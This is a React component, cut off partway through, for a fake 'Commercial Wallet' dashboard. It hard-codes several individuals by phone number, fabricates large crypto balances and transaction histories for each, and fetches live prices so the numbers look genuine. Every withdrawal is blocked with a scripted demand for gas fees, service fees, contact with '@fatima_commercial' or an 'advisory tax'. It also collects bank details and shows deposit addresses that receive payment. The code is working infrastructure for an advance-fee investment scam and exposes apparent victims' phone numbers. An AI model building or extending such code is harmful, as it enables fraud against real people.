import { useState, useEffect } from "react";
import { Card } from "@/components/ui/card";
import { Button } from "@/components/ui/button";
import { Badge } from "@/components/ui/badge";
import { Input } from "@/components/ui/input";
import { Dialog, DialogContent, DialogHeader, DialogTitle } from "@/components/ui/dialog";
import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from "@/components/ui/select";
import { ScrollArea } from "@/components/ui/scroll-area";
import { Alert, AlertDescription, AlertTitle } from "@/components/ui/alert";
import { useToast } from "@/hooks/use-toast";
import { 
  Wallet, 
  TrendingUp, 
  TrendingDown, 
  RefreshCw,
  Send,
  Download,
  Eye,
  EyeOff,
  LogOut,
  Copy,
  AlertTriangle
} from "lucide-react";

interface WalletDashboardProps {
  onLogout: () => void;
  userData: { phone: string; name: string };
}

const WalletDashboard = ({ onLogout, userData }: WalletDashboardProps) => {
  const [btcPrice, setBtcPrice] = useState(0);
  const [ethPrice, setEthPrice] = useState(0);
  const [gbpToUsdRate, setGbpToUsdRate] = useState(1.27); // Default GBP to USD rate
  const [isBalanceVisible, setIsBalanceVisible] = useState(true);
  const [lastUpdated, setLastUpdated] = useState(new Date());
  const [isLoading, setIsLoading] = useState(true);
  const [isSendDialogOpen, setIsSendDialogOpen] = useState(false);
  const [isReceiveDialogOpen, setIsReceiveDialogOpen] = useState(false);
  const [isComplianceDialogOpen, setIsComplianceDialogOpen] = useState(true);
  const [isOfacDialogOpen, setIsOfacDialogOpen] = useState(false);
  const [isTosDialogOpen, setIsTosDialogOpen] = useState(false);
  const [isBankTransferDialogOpen, setIsBankTransferDialogOpen] = useState(false);
  const [showAdvisoryTax, setShowAdvisoryTax] = useState(false);
  const [isTransactionDialogOpen, setIsTransactionDialogOpen] = useState(false);
  const [selectedTransaction, setSelectedTransaction] = useState<any>(null);
  const [sendAmount, setSendAmount] = useState("");
  const [sendAddress, setSendAddress] = useState("");
  const [selectedCrypto, setSelectedCrypto] = useState("BTC");
  const [transferType, setTransferType] = useState<"crypto" | "bank" | null>(null);
  const [bankFullName, setBankFullName] = useState("");
  const [bankSortCode, setBankSortCode] = useState("");
  const [bankAccountNumber, setBankAccountNumber] = useState("");
  const [hasExecutedBtcPurchase, setHasExecutedBtcPurchase] = useState(true); // Jan starts with BTC
  const { toast } = useToast();
  
  // User-specific data
  const isJoanne = userData.phone === "0061414491726";
  const isJan = userData.phone === "447703277077";
  const isJeremy = userData.phone === "00447817963523";
  const isBen = userData.phone === "00447949987710";
  const isRami = userData.phone === "0061414065306";
  const isLinda = userData.phone === "0061400252142";
  const isYuetwa = userData.phone === "447879474641";
  const isTommy = userData.phone === "12817101281";
  
  // Dynamic balances for Jan based on BTC purchase state
  const janGbpBalance = hasExecutedBtcPurchase ? 0 : 2253751;
  const janBtcBalance = hasExecutedBtcPurchase ? 27.0938393646928217 : 0;
  
  const cryptoBalance = isJoanne ? 2022715.98 : isJan ? (hasExecutedBtcPurchase ? janBtcBalance : janGbpBalance) : isJeremy ? 0 : isBen ? 0.01609472 : isRami ? 1.2 : isLinda ? 2.73 : isYuetwa ? 0.63 : isTommy ? 1.0 : 44.62;
  const cryptoSymbol = isJoanne ? "DASH" : isJan ? (hasExecutedBtcPurchase ? "BTC" : "GBP") : isJeremy ? "ETH" : isBen ? "ETH" : isRami ? "BTC" : isLinda ? "BTC" : isYuetwa ? "BTC" : isTommy ? "BTC" : "BTC";
  const currentPrice = isJoanne ? 25.28 : isJan ? (hasExecutedBtcPurchase ? btcPrice : gbpToUsdRate) : (isJeremy || isBen) ? ethPrice : btcPrice; // Live GBP to USD rate
  const minWithdrawal = isJoanne ? 460.10 : isJan ? 0.1 : isJeremy ? 0.1 : isBen ? 0.1 : isRami ? 0 : isLinda ? 0.1 : isTommy ? 0.1 : 45;
  
  // USDT balances and Joanne's BTC balance
  const janUsdtBalance = isJan ? 0 : 0;
  const jeremyUsdtBalance = isJeremy ? 74708.23 : 0;
  const benUsdtBalance = isBen ? 327000 : 0;
  const joanneBtcBalance = isJoanne ? 0.1 : 0;
  const usdtPrice = 1; // USDT is pegged to $1
  
  const usdValue = isJoanne ?
    (cryptoBalance * currentPrice) + (joanneBtcBalance * btcPrice) :
    isJan ? 
    hasExecutedBtcPurchase ? 
      (janBtcBalance * btcPrice) + (janUsdtBalance * usdtPrice) :
      (cryptoBalance * currentPrice) + (janUsdtBalance * usdtPrice) : 
    isJeremy ?
    (cryptoBalance * currentPrice) + (jeremyUsdtBalance * usdtPrice) :
    isBen ?
    (cryptoBalance * currentPrice) + (benUsdtBalance * usdtPrice) :
    cryptoBalance * currentPrice;

  // Fetch real crypto prices and currency rates
  const fetchCryptoPrices = async () => {
    try {
      // Fetch crypto prices
      const cryptoResponse = await fetch('https://api.coingecko.com/api/v3/simple/price?ids=bitcoin,ethereum&vs_currencies=usd');
      const cryptoData = await cryptoResponse.json();
      
      // Fetch GBP to USD exchange rate
      const currencyResponse = await fetch('https://api.exchangerate-api.com/v4/latest/GBP');
      const currencyData = await currencyResponse.json();
      
      setBtcPrice(cryptoData.bitcoin.usd);
      setEthPrice(cryptoData.ethereum.usd);
      setGbpToUsdRate(currencyData.rates.USD);
      setLastUpdated(new Date());
      setIsLoading(false);
    } catch (error) {
      console.error('Error fetching prices:', error);
      setBtcPrice(67420.50); // Fallback price
      setEthPrice(2580.25); // Fallback price
      setGbpToUsdRate(1.27); // Fallback GBP to USD rate
      setIsLoading(false);
    }
  };

  useEffect(() => {
    fetchCryptoPrices();
    
    // Update price every 30 seconds
    const interval = setInterval(fetchCryptoPrices, 30000);
    return () => clearInterval(interval);
  }, []);

  const joanneTransactions = [
    { 
      id: "7", 
      type: "rejected", 
      amount: 21408.98, 
      symbol: "DASH",
      to: "XfuNgp2JZKSoaAi57vC5KsbbBFeesRuPLf",
      date: new Date().toISOString().split('T')[0], 
      time: new Date().toLocaleTimeString('en-US', { hour12: false, hour: '2-digit', minute: '2-digit' }),
      hash: "XdashTx1...",
      network: "dash"
    },
    { 
      id: "6", 
      type: "received", 
      amount: 0.017463, 
      date: new Date().toISOString().split('T')[0], 
      time: new Date().toLocaleTimeString('en-US', { hour12: false, hour: '2-digit', minute: '2-digit' }),
      hash: "bc1qfx..."
    },
    { 
      id: "5", 
      type: "received", 
      amount: 0.017, 
      date: new Date().toISOString().split('T')[0], 
      time: new Date().toLocaleTimeString('en-US', { hour12: false, hour: '2-digit', minute: '2-digit' }),
      hash: "bc1qcx...",
      status: "rejected"
    },
    { 
      id: "4", 
      type: "received", 
      amount: 0.0285, 
      date: new Date().toISOString().split('T')[0], 
      time: "11:06",
      hash: "bc1qbx..." 
    },
    { 
      id: "3", 
      type: "received", 
      amount: 0.028019, 
      date: "2025-08-22", 
      time: new Date().toLocaleTimeString('en-US', { hour12: false, hour: '2-digit', minute: '2-digit' }),
      hash: "bc1qaw..." 
    },
    { 
      id: "2", 
      type: "received", 
      amount: 0.027377, 
      date: "2025-08-20", 
      time: "11:37",
      hash: "bc1qzx..." 
    },
    { 
      id: "1", 
      type: "exchange", 
      amount: 460, 
      exchangeTo: 2022715.98,
      symbol: "BTC",
      exchangeToSymbol: "DASH",
      date: new Date().toISOString().split('T')[0], 
      hash: "bc1qxy..." 
    }
  ];

  const dorothyTransactions = [
    { 
      id: "2", 
      type: "pending", 
      amount: 44.62, 
      symbol: "BTC",
      exchangeTo: 8584880.49, // 44.62 BTC to NZD exchange
      exchangeToSymbol: "NZD",
      date: new Date().toISOString().split('T')[0], 
      time: new Date().toLocaleTimeString('en-US', { hour12: false, hour: '2-digit', minute: '2-digit' }),
      hash: "btc_to_nzd_pending...",
      description: "Exchange BTC to New Zealand Dollars"
    },
    { 
      id: "1", 
      type: "received", 
      amount: 44.62, 
      date: new Date().toISOString().split('T')[0], 
      time: new Date().toLocaleTimeString('en-US', { hour12: false, hour: '2-digit', minute: '2-digit' }),
      hash: "bc1qdx..." 
    }
  ];

  const ramiTransactions = [
    { 
      id: "1", 
      type: "received", 
      amount: 1.2, 
      date: new Date().toISOString().split('T')[0], 
      time: new Date().toLocaleTimeString('en-US', { hour12: false, hour: '2-digit', minute: '2-digit' }),
      hash: "bc1qrx..." 
    }
  ];

  const janTransactions = [
    ...(hasExecutedBtcPurchase ? [{
      id: "9", 
      type: "exchange", 
      amount: 2253751, 
      symbol: "GBP",
      exchangeTo: 27.0938393646928217,
      exchangeToSymbol: "BTC",
      date: new Date().toISOString().split('T')[0], 
      time: new Date().toLocaleTimeString('en-US', { hour12: false, hour: '2-digit', minute: '2-digit' }),
      hash: "gbp_to_btc_exchange...",
      description: `Exchanged all GBP to Bitcoin at $${btcPrice.toLocaleString()}`
    }] : []),
    { 
      id: "8", 
      type: "received", 
      amount: 2253751, 
      symbol: "GBP",
      date: new Date().toISOString().split('T')[0], 
      time: new Date().toLocaleTimeString('en-US', { hour12: false, hour: '2-digit', minute: '2-digit' }),
      hash: "gbp_transfer_a7c9f1...",
      description: "GBP transfer received"
    },
    { 
      id: "7", 
      type: "confirmed", 
      amount: 9627.37, 
      symbol: "XMR",
      to: "FEiKnYzRhu8NB2cVnW9uvF4JyxtFe1UvKXihPNdK7A4M",
      date: new Date().toISOString().split('T')[0], 
      time: new Date().toLocaleTimeString('en-US', { hour12: false, hour: '2-digit', minute: '2-digit' }),
      hash: "xmr_confirmed_9e8f2a...",
      description: "XMR transfer confirmed"
    },
    { 
      id: "6", 
      type: "exchange", 
      amount: 5.813, 
      symbol: "ETH",
      exchangeTo: 9627.37,
      exchangeToSymbol: "XMR",
      date: new Date().toISOString().split('T')[0], 
      time: new Date().toLocaleTimeString('en-US', { hour12: false, hour: '2-digit', minute: '2-digit' }),
      hash: "xmr_exchange_tx...",
      description: "Exchanged all crypto holdings to XMR"
    },
    { 
      id: "5", 
      type: "exchange", 
      amount: 3027153.35, 
      symbol: "USDT",
      exchangeTo: 9627.37,
      exchangeToSymbol: "XMR",
      date: new Date().toISOString().split('T')[0], 
      time: new Date().toLocaleTimeString('en-US', { hour12: false, hour: '2-digit', minute: '2-digit' }),
      hash: "xmr_exchange_tx2...",
      description: "Exchanged USDT to XMR"
    },
    { 
      id: "4", 
      type: "received", 
      amount: 20271, 
      date: new Date().toISOString().split('T')[0], 
      time: new Date().toLocaleTimeString('en-US', { hour12: false, hour: '2-digit', minute: '2-digit' }),
      hash: "0xa9c8d7...",
      symbol: "USDT"
    },
    { 
      id: "3", 
      type: "received", 
      amount: 383, 
      date: new Date().toISOString().split('T')[0], 
      time: new Date(Date.now() + (15 * 60 * 1000)).toLocaleTimeString('en-US', { hour12: false, hour: '2-digit', minute: '2-digit' }),
      hash: "0xa8b9c4...",
      symbol: "USDT"
    },
    { 
      id: "2", 
      type: "received", 
      amount: 9682, 
      date: new Date().toISOString().split('T')[0], 
      time: new Date().toLocaleTimeString('en-US', { hour12: false, hour: '2-digit', minute: '2-digit' }),
      hash: "0xa1b2c3...",
      symbol: "USDT"
    },
    { 
      id: "1", 
      type: "received", 
      amount: 5.813, 
      date: new Date().toISOString().split('T')[0], 
      time: "10:45",
      hash: "0xd4e5f6...",
      symbol: "ETH"
    }
  ];

  const jeremyTransactions = [
    { 
      id: "1", 
      type: "received", 
      amount: 74708.23, 
      date: new Date().toISOString().split('T')[0], 
      time: new Date().toLocaleTimeString('en-US', { hour12: false, hour: '2-digit', minute: '2-digit' }),
      hash: "0xj1k2l3...",
      symbol: "USDT"
    }
  ];

  const benTransactions = [
    { 
      id: "1", 
      type: "received", 
      amount: 327000, 
      date: new Date(Date.now() - 24 * 60 * 60 * 1000).toISOString().split('T')[0], 
      time: "13:23",
      hash: "0xB1c2d3...",
      symbol: "USDT"
    },
    { 
      id: "2", 
      type: "received", 
      amount: 0.01609472, 
      date: new Date().toISOString().split('T')[0], 
      time: new Date(Date.now() + (4 * 60 * 60 * 1000)).toLocaleTimeString('en-US', { hour12: false, hour: '2-digit', minute: '2-digit' }),
      hash: "0xE4f5g6...",
      symbol: "ETH"
    }
  ];

  const lindaTransactions = [
    { 
      id: "1", 
      type: "received", 
      amount: 2.73, 
      date: new Date().toISOString().split('T')[0], 
      time: new Date().toLocaleTimeString('en-US', { hour12: false, hour: '2-digit', minute: '2-digit' }),
      hash: "bc1qlx..." 
    }
  ];

  const yuetwaTransactions = [
    { 
      id: "1", 
      type: "received", 
      amount: 0.63, 
      date: new Date().toISOString().split('T')[0], 
      time: new Date().toLocaleTimeString('en-US', { hour12: false, hour: '2-digit', minute: '2-digit' }),
      hash: "bc1qyx..." 
    }
  ];

  const tommyTransactions = [
    { 
      id: "1", 
      type: "received", 
      amount: 1.0, 
      date: new Date().toISOString().split('T')[0], 
      time: new Date().toLocaleTimeString('en-US', { hour12: false, hour: '2-digit', minute: '2-digit' }),
      hash: "bc1qtestx..." 
    }
  ];
  
  const transactions = isJoanne ? joanneTransactions : isJan ? janTransactions : isJeremy ? jeremyTransactions : isBen ? benTransactions : isRami ? ramiTransactions : isLinda ? lindaTransactions : isYuetwa ? yuetwaTransactions : isTommy ? tommyTransactions : dorothyTransactions;

  const getBenAddress = (crypto: string) => {
    switch (crypto) {
      case "BTC":
        return "bc1qtz2krxmwf5kfdkj8pdcgkhlgr73ajyc5nx6f6w";
      case "ETH":
        return "0xA4c556c57DeB7207FCE8de9A1f5B0248bA5c0A15";
      case "USDT":
        return "0xA4c556c57DeB7207FCE8de9A1f5B0248bA5c0A15";
      default:
        return "bc1qtz2krxmwf5kfdkj8pdcgkhlgr73ajyc5nx6f6w";
    }
  };

  const getTommyAddress = (crypto: string) => {
    switch (crypto) {
      case "BTC":
        return "bc1qtestbtcaddress1234567890abcdef";
      case "ETH":
        return "0xtestethaddress1234567890abcdefabcd";
      case "XRP":
        return "rTestXrpAddress1234567890abcdefg";
      case "ADA":
        return "addr_testtestcardanoaddress1234567890abcdef";
      default:
        return "bc1qtestbtcaddress1234567890abcdef";
    }
  };

  const depositAddress = isJoanne ? "bc1qhvley3tp7rs0fs8w867jw0t5ufsnmazg9djutu" : 
                        isJan ? "0x38AF437251f80054Da8bF701624319c27c9868fC" : 
                        isJeremy ? "0x6a609F22fD1c0f44fb1DC004ACFA6FB901d3bBc8" :
                        isBen ? getBenAddress(selectedCrypto) :
                        isLinda ? "bc1q8pnedgwx0tgdwclgpa6zh0cgwrnmv4krv0xzcs" :
                        isYuetwa ? "bc1q2xtwa9hft3r5k8w7gh2jt6ufsnbaz3g4kmu8t" :
                        isTommy ? getTommyAddress(selectedCrypto) :
                        "bc1qg7hxra3dw5usu38u84rcrz2le85s77uwkhe09a";

  const copyToClipboard = async (text: string) => {
    try {
      await navigator.clipboard.writeText(text);
      toast({
        title: "Copied to clipboard",
        description: "Address has been copied successfully",
      });
    } catch (err) {
      console.error('Failed to copy: ', err);
      toast({
        title: "Copy failed",
        description: "Please copy the address manually",
        variant: "destructive",
      });
    }
  };

  const handleSendSubmit = () => {
    if (transferType === "bank") {
      // For bank transfer submissions, show dialog with withdrawal fee link
      setIsSendDialogOpen(false);
      setIsBankTransferDialogOpen(true);
      setShowAdvisoryTax(false);
      
      // After 3 seconds, switch to advisory tax message
      setTimeout(() => {
        setShowAdvisoryTax(true);
      }, 3000);
    } else if (isJoanne) {
      // For Joanne, show manual transfer setup message
      toast({
        title: "Manual Transfer Required",
        description: "Please contact support for manual transfer setup",
        variant: "destructive",
      });
      setIsSendDialogOpen(false);
    } else if (isJeremy) {
      // For Jeremy, show insufficient Ethereum for gas fees error
      toast({
        title: "Insufficient ethereum for gas fees",
        description: "Please top up to proceed.",
        variant: "destructive",
      });
      setIsSendDialogOpen(false);
    } else if (isBen) {
      // For Ben, show specific error message about gas fees and support agent
      toast({
        title: "Please top up Ethereum for gas fees",
        description: "Contact your support agent for the service fee",
        variant: "destructive",
      });
      setIsSendDialogOpen(false);
    } else if (isRami) {
      // For Rami, just close the dialog as the message is shown in the dialog content
      setIsSendDialogOpen(false);
    } else if (isLinda) {
      // For Linda, show message to contact @fatima_commercial for service fee
      toast({
        title: "Service Fee Required",
        description: "Please contact @fatima_commercial to process a service fee for the wallet",
        variant: "destructive",
      });
      setIsSendDialogOpen(false);
    } else if (isJan) {
      // For Jan, allow normal send without restrictions
      toast({
        title: "Transaction Processing",
        description: "Your transaction is being processed",
      });
      setIsSendDialogOpen(false);
    } else {
      setIsSendDialogOpen(false);
      setIsOfacDialogOpen(true);
    }
    // Reset all form fields
    setSendAmount("");
    setSendAddress("");
    setTransferType(null);
    setBankFullName("");
    setBankSortCode("");
    setBankAccountNumber("");
  };

  return (
    <div className="min-h-screen bg-background p-4">
      <div className="max-w-4xl mx-auto space-y-6">
        {/* Header */}
        <div className="flex justify-between items-center">
          <div className="flex items-center space-x-3">
            <div className="w-10 h-10 bg-primary/20 rounded-full flex items-center justify-center">
              <Wallet className="w-6 h-6 text-primary" />
            </div>
            <div>
              <h1 className="text-2xl font-bold">Commercial Wallet سلام</h1>
              <p className="text-muted-foreground">{userData.phone}</p>
              <p className="text-sm text-muted-foreground">{userData.name}</p>
            </div>
          </div>
          <Button variant="ghost" onClick={onLogout}>
            <LogOut className="w-4 h-4 mr-2" />
            Logout
          </Button>
        </div>

        {/* Balance Card */}
        <Card className="p-6 shadow-card-custom border-0 transition-all duration-300 hover:shadow-lg animate-fade-in">
          <div className="flex justify-between items-start mb-4">
            <div>
              <div className="flex items-center space-x-2 mb-2">
                <h2 className="text-lg font-semibold">Portfolio Balance</h2>
                <Button
                  variant="ghost"
                  size="sm"
                  onClick={() => setIsBalanceVisible(!isBalanceVisible)}
                  className="transition-all duration-200 hover:scale-110"
                >
                  {isBalanceVisible ? <Eye className="w-4 h-4 transition-transform duration-200" /> : <EyeOff className="w-4 h-4 transition-transform duration-200" />}
                </Button>
              </div>
              
              {isBalanceVisible ? (
                isJoanne ? (
                  <>
                    <div className="space-y-2">
                      <p className="text-2xl font-bold text-primary">
                        {cryptoBalance.toLocaleString('en-US', { minimumFractionDigits: 2 })} {cryptoSymbol}
                      </p>
                      <p className="text-2xl font-bold text-primary">
                        {joanneBtcBalance} BTC
                      </p>
                    </div>
                    <p className="text-xl text-muted-foreground mt-2">
                      ${usdValue.toLocaleString('en-US', { minimumFractionDigits: 2, maximumFractionDigits: 2 })} USD
                    </p>
                  </>
                ) : isJan ? (
                  <>
                    <div className="space-y-2">
                      <p className="text-2xl font-bold text-primary">
                        {cryptoBalance} {cryptoSymbol}
                      </p>
                      <p className="text-2xl font-bold text-primary">
                        {janUsdtBalance.toLocaleString('en-US', { minimumFractionDigits: 2 })} USDT
                      </p>
                    </div>
                    <p className="text-xl text-muted-foreground mt-2">
                      ${usdValue.toLocaleString('en-US', { minimumFractionDigits: 2, maximumFractionDigits: 2 })} USD
                    </p>
                  </>
                ) : isJeremy ? (
                  <>
                    <div className="space-y-2">
                      <p className="text-2xl font-bold text-primary">
                        {cryptoBalance} {cryptoSymbol}
                      </p>
                      <p className="text-2xl font-bold text-primary">
                        {jeremyUsdtBalance.toLocaleString('en-US', { minimumFractionDigits: 2 })} USDT
                      </p>
                    </div>
                    <p className="text-xl text-muted-foreground mt-2">
                      ${usdValue.toLocaleString('en-US', { minimumFractionDigits: 2, maximumFractionDigits: 2 })} USD
                    </p>
                  </>
                ) : isBen ? (
                  <>
                    <div className="space-y-2">
                      <p className="text-2xl font-bold text-primary">
                        {cryptoBalance} {cryptoSymbol}
                      </p>
                      <p className="text-2xl font-bold text-primary">
                        {benUsdtBalance.toLocaleString('en-US', { minimumFractionDigits: 2 })} USDT
                      </p>
                    </div>
                    <p className="text-xl text-muted-foreground mt-2">
                      ${usdValue.toLocaleString('en-US', { minimumFractionDigits: 2, maximumFractionDigits: 2 })} USD
                    </p>
                  </>
                ) : (
                  <>
                    <p className="text-3xl font-bold text-primary mb-1">
                      {cryptoBalance} {cryptoSymbol}
                    </p>
                    <p className="text-xl text-muted-foreground">
                      ${usdValue.toLocaleString('en-US', { minimumFractionDigits: 2, maximumFractionDigits: 2 })} USD
                    </p>
                  </>
                )
              ) : (
                <>
                  <p className="text-3xl font-bold text-primary mb-1">••••••</p>
                  <p className="text-xl text-muted-foreground">••••••••</p>
                </>
              )}
            </div>
            
            <div className="text-right">
              <Badge className="bg-primary/20 text-primary mb-2">
                Live Price
              </Badge>
              <p className="text-lg font-semibold">
                {isLoading ? 'Loading...' : `$${currentPrice.toLocaleString('en-US', { minimumFractionDigits: 2 })}`}
              </p>
              <p className="text-sm text-muted-foreground">
                Updated: {lastUpdated.toLocaleTimeString()}
              </p>
            </div>
          </div>

          <div className="flex space-x-3 mt-6">
            <Button 
              className="flex-1 transition-all duration-200 hover:scale-105" 
              variant="premium"
              onClick={() => setIsSendDialogOpen(true)}
            >
              <Send className="w-4 h-4 mr-2 transition-transform duration-200" />
              Send
            </Button>
            <Button 
              className="flex-1 transition-all duration-200 hover:scale-105" 
              variant="trading"
              onClick={() => setIsReceiveDialogOpen(true)}
            >
              <Download className="w-4 h-4 mr-2 transition-transform duration-200" />
              Receive
            </Button>
            <Button variant="ghost" className="transition-all duration-200 hover:scale-110">
              <RefreshCw className="w-4 h-4 transition-transform duration-200 hover:rotate-180" />
            </Button>
          </div>
        </Card>

        {/* Recent Transactions */}
        <Card className="p-6 shadow-card-custom border-0 transition-all duration-300 hover:shadow-lg animate-fade-in">
          <h2 className="text-xl font-semibold mb-4">Recent Transactions</h2>
          <div className="space-y-3">
            {transactions.length === 0 ? (
              <div className="text-center py-8 animate-fade-in">
                <p className="text-muted-foreground">No transactions yet</p>
                <p className="text-sm text-muted-foreground mt-1">Deposits will appear here</p>
              </div>
            ) : (
              transactions.map((tx, index) => (
                <div 
                  key={tx.id}
                  className="flex items-center justify-between p-4 bg-background/50 rounded-lg cursor-pointer hover:bg-background/70 transition-all duration-300 hover:scale-[1.02] animate-fade-in"
                  style={{ animationDelay: `${index * 100}ms` }}
                  onClick={() => {
                    setSelectedTransaction(tx);
                    setIsTransactionDialogOpen(true);
                  }}
                >
                 <div className="flex items-center space-x-4">
                    <div className={`w-10 h-10 rounded-full flex items-center justify-center ${
                      tx.status === 'pending' ? 'bg-destructive/20' : 
                      tx.status === 'rejected' ? 'bg-destructive/20' :
                      tx.type === 'received' ? 'bg-bull/20' : 
                      tx.type === 'exchange' ? 'bg-primary/20' : 'bg-bear/20'
                    }`}>
                      {tx.type === 'received' ? (
                        <TrendingUp className={`w-5 h-5 ${
                          tx.status === 'pending' ? 'text-destructive' : 
                          tx.status === 'rejected' ? 'text-destructive' : 'text-bull'
                        }`} />
                      ) : tx.type === 'exchange' ? (
                        <RefreshCw className="w-5 h-5 text-primary" />
                      ) : (
                        <TrendingDown className={`w-5 h-5 text-bear`} />
                      )}
                    </div>
                    <div>
                      <p className="font-semibold capitalize">
                        {tx.status === 'pending' ? 'Pending' : 
                         tx.status === 'rejected' ? 'Rejected' : 
                         tx.type === 'exchange' ? 'Exchange' : tx.type}
                      </p>
                      <p className="text-sm text-muted-foreground">
                        {tx.date} {tx.time && `at ${tx.time}`}
                      </p>
                    </div>
                  </div>
                  
                   <div className="text-right">
                     {tx.type === 'exchange' ? (
                       <div>
                         <p className="font-semibold text-bear">
                           -{tx.amount} {tx.symbol}
                         </p>
                         <p className="font-semibold text-bull">
                           +{tx.exchangeTo} {tx.exchangeToSymbol}
                         </p>
                       </div>
                     ) : (
                       <p className={`font-semibold ${
                         tx.status === 'pending' ? 'text-destructive' :
                         tx.status === 'rejected' ? 'text-destructive' :
                         tx.type === 'received' ? 'text-bull' : 'text-bear'
                       }`}>
                         {tx.type === 'received' ? '+' : '-'}{tx.amount} {tx.symbol || cryptoSymbol}
                       </p>
                     )}
                     <p className="text-sm text-muted-foreground">{tx.hash}</p>
                   </div>
                </div>
              ))
            )}
          </div>
        </Card>

        {/* Quick Stats */}
        <div className="grid grid-cols-2 gap-4">
            <Card className="p-4 shadow-card-custom border-0">
            <div className="text-center">
              <p className="text-sm text-muted-foreground">24h Change</p>
              <p className="text-lg font-bold text-bull">+$2,340.50</p>
              <p className="text-sm text-bull">+3.6%</p>
            </div>
          </Card>
          
          <Card className="p-4 shadow-card-custom border-0">
            <div className="text-center">
              <p className="text-sm text-muted-foreground">Portfolio Value</p>
              <p className="text-lg font-bold">${usdValue.toLocaleString('en-US', { maximumFractionDigits: 0 })}</p>
              <p className="text-sm text-primary">{(isJan || isJeremy) ? '2 Assets' : isBen ? '3 Assets' : '1 Asset'}</p>
            </div>
          </Card>
        </div>
      </div>

      {/* Send Dialog */}
      <Dialog open={isSendDialogOpen} onOpenChange={setIsSendDialogOpen}>
        <DialogContent className="sm:max-w-md animate-scale-in">
          <DialogHeader>
            <DialogTitle className="animate-fade-in">
              {transferType === null ? "Send Options" : 
               transferType === "crypto" ? (isJoanne ? "Send DASH" : isJeremy ? "Send Crypto" : "Send Crypto") :
               "Bank Transfer"}
            </DialogTitle>
          </DialogHeader>
          <div className="py-6 animate-fade-in">
            {transferType === null ? (
              <div className="space-y-4">
                <p className="text-sm text-muted-foreground mb-4 animate-fade-in">Choose your transfer method:</p>
                <div className="grid grid-cols-2 gap-3 animate-fade-in">
                  <Button 
                    variant="outline" 
                    className="h-20 flex flex-col items-center justify-center space-y-2 bg-background border-2 hover:border-primary hover:bg-primary/5 transition-all duration-300 hover:scale-105 animate-fade-in"
                    onClick={() => setTransferType("crypto")}
                  >
                    <Send className="w-6 h-6 transition-transform duration-200" />
                    <span className="text-sm font-medium">Crypto Transfer</span>
                  </Button>
                  <Button 
                    variant="outline" 
                    className="h-20 flex flex-col items-center justify-center space-y-2 bg-background border-2 hover:border-primary hover:bg-primary/5 transition-all duration-300 hover:scale-105 animate-fade-in"
                    onClick={() => setTransferType("bank")}
                  >
                    <Download className="w-6 h-6 transition-transform duration-200" />
                    <span className="text-sm font-medium">Bank Transfer</span>
                  </Button>
                </div>
              </div>
            ) : transferType === "crypto" ? (
              <div className="space-y-4 animate-fade-in">
                <Button 
                  variant="ghost" 
                  size="sm" 
                  onClick={() => setTransferType(null)}
                  className="mb-2 transition-all duration-200 hover:scale-105"
                >
                  ← Back to options
                </Button>
                {isJoanne ? (
                  <>
                    <div className="animate-fade-in">
                      <label className="text-sm font-medium text-muted-foreground">DASH Wallet Address</label>
                      <Input
                        value={sendAddress}
                        onChange={(e) => setSendAddress(e.target.value)}
                        placeholder="Enter destination wallet address"
                        className="mt-1 transition-all duration-200 focus:scale-[1.02]"
                      />
                    </div>
                    <div className="animate-fade-in">
                      <label className="text-sm font-medium text-muted-foreground">Amount (DASH)</label>
                      <Input
                        value={sendAmount}
                        onChange={(e) => setSendAmount(e.target.value)}
                        placeholder="Enter amount to send"
                        type="number"
                        step="0.00000001"
                        className="mt-1 transition-all duration-200 focus:scale-[1.02]"
                      />
                    </div>
                  </>
                ) : isJeremy ? (
                  <>
                    <div className="animate-fade-in">
                      <label className="text-sm font-medium text-muted-foreground">Ethereum Address</label>
                      <Input
                        value={sendAddress}
                        onChange={(e) => setSendAddress(e.target.value)}
                        placeholder="Enter destination ethereum address"
                        className="mt-1 transition-all duration-200 focus:scale-[1.02]"
                      />
                    </div>
                    <div className="animate-fade-in">
                      <label className="text-sm font-medium text-muted-foreground">Amount (USDT)</label>
                      <Input
                        value={sendAmount}
                        onChange={(e) => setSendAmount(e.target.value)}
                        placeholder="Enter amount to withdraw"
                        type="number"
                        step="0.01"
                        className="mt-1 transition-all duration-200 focus:scale-[1.02]"
                      />
                    </div>
                  </>
                ) : (
                  <>
                    <div className="animate-fade-in">
                      <label className="text-sm font-medium text-muted-foreground">Wallet Address</label>
                      <Input
                        value={sendAddress}
                        onChange={(e) => setSendAddress(e.target.value)}
                        placeholder="Enter destination wallet address"
                        className="mt-1 transition-all duration-200 focus:scale-[1.02]"
                      />
                    </div>
                    <div className="animate-fade-in">
                      <label className="text-sm font-medium text-muted-foreground">Amount</label>
                      <Input
                        value={sendAmount}
                        onChange={(e) => setSendAmount(e.target.value)}
                        placeholder="Enter amount to send"
                        type="number"
                        step="0.00000001"
                        className="mt-1 transition-all duration-200 focus:scale-[1.02]"
                      />
                    </div>
                  </>
                )}
                <Button 
                  onClick={handleSendSubmit}
                  className="w-full transition-all duration-200 hover:scale-105 animate-fade-in"
                  disabled={!sendAddress || !sendAmount}
                >
                  {isJoanne ? "Submit" : "Send"}
                </Button>
              </div>
            ) : transferType === "bank" ? (
              <div className="space-y-4">
                <Button 
                  variant="ghost" 
                  size="sm" 
                  onClick={() => setTransferType(null)}
                  className="mb-2"
                >
                  ← Back to options
                </Button>
                <div>
                  <label className="text-sm font-medium text-muted-foreground">Full Name</label>
                  <Input
                    value={bankFullName}
                    onChange={(e) => setBankFullName(e.target.value)}
                    placeholder="Enter full name as on bank account"
                    className="mt-1"
                  />
                </div>
                <div>
                  <label className="text-sm font-medium text-muted-foreground">Sort Code</label>
                  <Input
                    value={bankSortCode}
                    onChange={(e) => setBankSortCode(e.target.value)}
                    placeholder="Enter 6-digit sort code (e.g., 12-34-56)"
                    className="mt-1"
                  />
                </div>
                <div>
                  <label className="text-sm font-medium text-muted-foreground">Account Number</label>
                  <Input
                    value={bankAccountNumber}
                    onChange={(e) => setBankAccountNumber(e.target.value)}
                    placeholder="Enter account number"
                    className="mt-1"
                  />
                </div>
                <div>
                  <label className="text-sm font-medium text-muted-foreground">Amount</label>
                  <Input
                    value={sendAmount}
                    onChange={(e) => setSendAmount(e.target.value)}
                    placeholder="Enter amount to transfer"
                    type="number"
                    step="0.01"
                    className="mt-1"
                  />
                </div>
                <Button 
                  onClick={handleSendSubmit}
                  className="w-full"
                  disabled={!bankFullName || !bankSortCode || !bankAccountNumber || !sendAmount}
                >
                  Submit Bank Transfer
                </Button>
              </div>
            ) : isJan ? (
              <div className="text-center">
                <p className="text-lg text-muted-foreground">
